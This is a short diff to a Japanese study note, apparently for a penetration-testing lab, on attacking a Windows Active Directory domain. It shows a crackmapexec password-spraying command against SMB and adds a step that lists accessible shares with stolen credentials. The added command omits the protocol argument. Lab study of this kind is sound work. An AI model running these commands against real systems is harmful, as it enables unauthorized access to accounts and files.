@@ -9,3 +9,8 @@ WindowsのAD環境に対して、列挙したユーザ名を使ったパスワ�
 ```
 crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success
 ```
+
+2. ターゲット上のsmbでアクセスが許可されているふぁいるとふぉるだの一覧を取得する
+```
+crackmapexec 192.168.50.242 -u john -p "hoge" --shares
+```
